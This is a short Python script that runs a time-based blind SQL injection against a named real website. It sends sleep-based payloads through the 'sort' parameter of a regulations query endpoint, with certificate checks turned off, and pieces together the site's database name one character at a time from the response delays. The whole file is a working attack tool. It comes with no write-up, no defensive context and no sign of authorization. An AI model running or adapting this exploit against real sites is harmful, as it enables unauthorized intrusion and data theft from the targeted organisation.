import requests
import time


data_name = ""
zfc = "1234567890qwertyuiopasdfghjklzxcvbnm_"
for i in range(18):
	i += 1
	for s in zfc:
		requests.packages.urllib3.disable_warnings()
		url = "https://www.nxsljgpt.com.cn/business/regulations/queryByPageAndCondition.do"
		headers = {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
		data = "pageSize=10&pageNumber=1&sort=desc,(if(substr(database(),"+str(i)+",1)='"+s+"',sleep(3),1))&moduleId=c36a7e94624d11e8a481507b9d52033c&regulationsTypeCode=XGWJ&titleLike="
		ts1 = int(time.time())
		requests.post(url,headers=headers,verify=False,data=data)
		ts2 = int(time.time())
		if (ts2-ts1>2):
			data_name += s
			print(data_name)
			break

